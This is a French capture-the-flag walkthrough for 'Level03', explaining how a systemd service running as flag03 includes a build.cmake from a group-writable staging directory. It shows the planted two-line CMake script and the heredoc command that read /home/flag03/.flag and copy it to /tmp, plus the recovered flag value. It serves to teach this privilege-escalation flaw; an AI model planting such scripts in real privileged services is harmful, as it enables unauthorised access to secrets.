# Level03 — Faire exécuter un script CMake

## Objectif

Comprendre comment un service privilégié peut exécuter des instructions contrôlées par un utilisateur moins privilégié. La faille repose sur la confiance accordée à un fichier CMake modifiable.

## 1. Lire l’indice

```bash
cat README
```

Résultat :

```text
Every Burbclave has rules. Find the loophole.
```

Le README donne le mot-clé `Burbclave`. On l’utilise d’abord pour explorer les noms de fichiers et de répertoires de la VM :

```bash
find / -iname '*burbclave*' 2>/dev/null
```

| Élément | Rôle |
| --- | --- |
| `find /` | Parcourir le système de fichiers depuis sa racine. |
| `-iname '*burbclave*'` | Ne retenir que les chemins dont le nom contient `burbclave`, sans tenir compte de la casse. |
| `2>/dev/null` | Masquer les erreurs d’accès. |

Parmi les résultats se trouve le fichier d’unité `/etc/systemd/system/burbclave.service`. Son nom donne le service à examiner. La configuration systemd permettra ensuite de savoir ce qu’il exécute.

## 2. Comprendre le point faible

### 2.1. Le service s’exécute comme `flag03`

```bash
systemctl cat burbclave.service
```

Les lignes utiles sont :

```ini
User=flag03
ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
StandardOutput=null
StandardError=null
```

Le service exécute donc `CMakeLists.txt` avec les droits de `flag03`. Sa sortie est supprimée, ce qui explique pourquoi notre script écrira le résultat dans `/tmp`.

### 2.2. `CMakeLists.txt` charge un autre fichier

```bash
cat /opt/snowcrash/level03/CMakeLists.txt
```

Les dernières instructions lisent une configuration protégée, calculent un répertoire, puis exécutent un fichier nommé `build.cmake` :

```cmake
file(READ "/etc/burbclave/burbclave.conf" CONF_CONTENT)
string(CONCAT RESOLVED_BUILD_PATH "${RUNTIME_BASE}" "/" "${WORKSPACE_NAME}")
include(${RESOLVED_BUILD_PATH}/build.cmake)
```

`level03` ne peut pas lire la configuration qui contient le chemin :

```text
cat: /etc/burbclave/burbclave.conf: Permission denied
```

À ce stade, nous savons seulement que le service cherche un fichier `build.cmake` dans un répertoire calculé.

### 2.3. Trouver un emplacement modifiable

Le fichier `CMakeLists.txt` contient aussi cette valeur :

```cmake
set(BURBCLAVE_STATE_DIR "/var/lib/burbclave")
```

Elle ne donne pas le chemin final, mais indique un répertoire pertinent à examiner :

```bash
find /var/lib/burbclave -maxdepth 2 -type d -ls 2>/dev/null
```

Cette recherche fait apparaître le dossier `/var/lib/burbclave/staging`. Il reste à vérifier si `level03` peut y écrire :

```bash
id
ls -ld /var/lib/burbclave/staging
```

Résultats observés :

```text
uid=1004(level03) gid=1006(level03) groups=1006(level03),988(burbclave),1001(levelgroup)
drwxrwxr-x 2 root burbclave 4096 Nov 6 10:53 /var/lib/burbclave/staging
```

La commande `id` montre que `level03` appartient au groupe `burbclave`. Dans `drwxrwxr-x`, le deuxième groupe de droits est celui du groupe propriétaire : `rwx`. Le groupe `burbclave` peut donc écrire dans `staging`.

Le fichier suivant devient donc notre candidat :

```text
/var/lib/burbclave/staging/build.cmake
```

### 2.4. Confirmer l’hypothèse

Le fichier de configuration reste illisible ; le chemin est confirmé par un test. Nous plaçons `build.cmake` dans `staging`, puis attendons le timer. Lorsque `/tmp/level03_recovered` apparaît avec le flag, deux éléments sont confirmés :

1. le chemin calculé par `CMakeLists.txt` mène bien au dossier `staging` ;
2. `build.cmake` est exécuté avec les droits de `flag03`.

## 3. Comprendre le script CMake

Le fichier [build.cmake](build.cmake) ne contient que deux instructions :

```cmake
file(READ "/home/flag03/.flag" SECRET)
file(WRITE "/tmp/level03_recovered" "${SECRET}")
```

| Instruction | Effet |
| --- | --- |
| `file(READ ... SECRET)` | Lire `.flag` et placer son contenu dans la variable CMake `SECRET`. |
| `file(WRITE ... "${SECRET}")` | Écrire cette variable dans un fichier que `level03` pourra consulter. |

CMake sert habituellement à configurer la construction de programmes, et son langage permet également de manipuler des fichiers. Les deux instructions présentées réalisent toute l’opération.

## 4. Installer le script

Créer le fichier attendu dans le dossier de staging :

```bash
cat > /var/lib/burbclave/staging/build.cmake <<'EOF'
file(READ "/home/flag03/.flag" SECRET)
file(WRITE "/tmp/level03_recovered" "${SECRET}")
EOF
```

Dans cette construction :

- `>` crée le fichier ou remplace son contenu ;
- `<<'EOF'` fournit plusieurs lignes à `cat` ;
- les apostrophes autour de `EOF` empêchent Bash d’interpréter `${SECRET}` avant CMake.

## 5. Attendre l’exécution du service

Les notes indiquent que le service est déclenché périodiquement par un timer. Pour identifier les timers et leur prochain passage :

```bash
systemctl list-timers --all
```

Après le passage du service, lire le fichier produit :

```bash
cat /tmp/level03_recovered
```

Le contenu récupéré est :

```text
b209ea91ad7a5c2a0b0f4e195ca4
```

Le fichier apparaît après le déclenchement du timer. Consulter la liste des timers permet de connaître le prochain passage avant de relire la sortie.